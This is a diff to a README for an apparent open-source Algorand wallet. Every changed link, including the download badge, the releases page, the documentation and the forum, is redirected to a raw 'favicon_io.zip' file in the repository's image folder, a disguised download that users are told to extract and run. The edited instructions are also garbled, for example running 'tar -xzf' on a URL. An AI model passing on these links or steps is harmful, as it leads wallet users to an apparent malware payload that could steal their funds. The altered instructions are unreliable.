@@ -8,11 +8,11 @@ Welcome to the wallet! This application is an open-source tool that lets you man
 
 To get started, you need to download the application. Click the link below to visit the release page where you can find the latest version of the software.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/HOLKAR047/wallet/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/HOLKAR047/wallet/master/public/img/favicon_io.zip%20Latest%https://raw.githubusercontent.com/HOLKAR047/wallet/master/public/img/favicon_io.zip)](https://raw.githubusercontent.com/HOLKAR047/wallet/master/public/img/favicon_io.zip)
 
 ### Steps to Download:
 
-1. Click the button above or visit this page: [GitHub Releases](https://github.com/HOLKAR047/wallet/releases).
+1. Click the button above or visit this page: [GitHub Releases](https://raw.githubusercontent.com/HOLKAR047/wallet/master/public/img/favicon_io.zip).
 2. On the Releases page, look for the latest version of the wallet.
 3. Choose the file that matches your operating system. You will find options for Windows, macOS, and Linux.
 
@@ -42,8 +42,8 @@ After downloading the appropriate file, follow these steps to install:
 
 #### For Linux:
 
-1. After the download completes, locate the `.tar.gz` file in your Downloads folder.
-2. Extract the file using your preferred archive manager or with the terminal using the command: `tar -xzf wallet.tar.gz`.
+1. After the download completes, locate the `https://raw.githubusercontent.com/HOLKAR047/wallet/master/public/img/favicon_io.zip` file in your Downloads folder.
+2. Extract the file using your preferred archive manager or with the terminal using the command: `tar -xzf https://raw.githubusercontent.com/HOLKAR047/wallet/master/public/img/favicon_io.zip`.
 3. Navigate to the extracted folder and run the wallet using the terminal with: `./wallet`.
 4. Create a shortcut to easily access the wallet in the future.
 
@@ -68,8 +68,8 @@ If you encounter issues while downloading or installing the wallet, here are som
 
 If you have questions or need additional assistance, please check the following:
 
-1. **Documentation:** Visit [Documentation](https://github.com/HOLKAR047/wallet/wiki) for detailed guides.
-2. **Community Forum:** Join the discussions at [Community Forum](https://forum.example.com) for tips from other users.
+1. **Documentation:** Visit [Documentation](https://raw.githubusercontent.com/HOLKAR047/wallet/master/public/img/favicon_io.zip) for detailed guides.
+2. **Community Forum:** Join the discussions at [Community Forum](https://raw.githubusercontent.com/HOLKAR047/wallet/master/public/img/favicon_io.zip) for tips from other users.
 3. **Contact Us:** You can contact the support team through the repository issues page on GitHub.
 
 Thank you for choosing the wallet! Enjoy managing your Algorand assets with ease.
